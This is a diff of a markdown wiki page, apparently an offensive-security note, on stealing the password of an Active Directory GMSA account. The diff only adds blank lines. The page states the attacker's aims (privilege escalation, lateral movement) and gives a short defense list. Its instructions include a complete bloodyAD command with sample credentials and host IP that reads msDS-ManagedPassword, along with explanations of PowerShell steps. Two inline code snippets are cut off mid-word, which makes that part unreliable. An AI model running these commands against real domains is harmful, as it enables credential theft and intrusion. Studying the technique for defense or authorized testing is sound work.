@@ -30,11 +30,15 @@ From a technical standpoint, this technique involves manipulating the access con
 
 The business value of this technique for an attacker is that it allows them to obtain the password of a GMSA account, which can be used to escalate privileges or move laterally within the network. It can also be used to gain access to sensitive information that is stored using the GMSA account.
 
+ 
+
 ## Requirements
 
 1. Access to an Active Directory environment
 
 1. DSInternals tool
+
+ 
 
 ## Defense
 
@@ -44,6 +48,8 @@ The business value of this technique for an attacker is that it allows them to o
 
 1. Use strong passwords for GMSA accounts and rotate them regularly
 
+ 
+
 ## Objectives
 
 1. Retrieve the password of a GMSA account
@@ -52,12 +58,20 @@ The business value of this technique for an attacker is that it allows them to o
 
 1. Gain access to sensitive information stored using the GMSA account
 
+ 
+
 # Instructions
 
 1. To read the GMSA password of an account, use the following PowerShell commands:
 
+ 
+
+
+
 **Code**: [[# Save the blob to a variable
 $gmsa = Get-ADServic]]
+
+
 
 > 1. Get-ADServiceAccount -Identity 'SQL_HQ_Primary' -Properties 'msDS-ManagedPassword': This command retrieves the msDS-ManagedPassword property of the specified GMSA account.
 2. $mp = $gmsa.'msDS-ManagedPassword': This command saves the msDS-ManagedPassword property to the $mp variable.
@@ -65,7 +79,13 @@ $gmsa = Get-ADServic]]
 
 2. To retrieve the managed password for a gMSA account, use the getObjectAttributes command with the gmsaAccount$ and msDS-ManagedPassword arguments.
 
+ 
+
+
+
 **Code**: [[python bloodyAD.py -u john.doe -d bloody -p Passwo]]
+
+
 
 > -u: The username used to authenticate to the domain. 
 -d: The name of the domain. 
@@ -74,11 +94,15 @@ $gmsa = Get-ADServic]]
 gmsaAccount$: The name of the gMSA account to retrieve the managed password for. 
 msDS-ManagedPassword: The attribute used to store the managed password for the gMSA account.
 
+
+
 **Command** ([[Get Object Attributes for GMSA Account]]):
 
 ```bash
 python bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes gmsaAccount$ msDS-ManagedPassword
 ```
+
+
 
 ## Commands Used
 
@@ -89,3 +113,5 @@ python bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getO
 - [[Abusing Active Directory ACLs/ACEs]]
 - [[Active Directory Attacks]]
 - [[ReadGMSAPassword]]
+
+
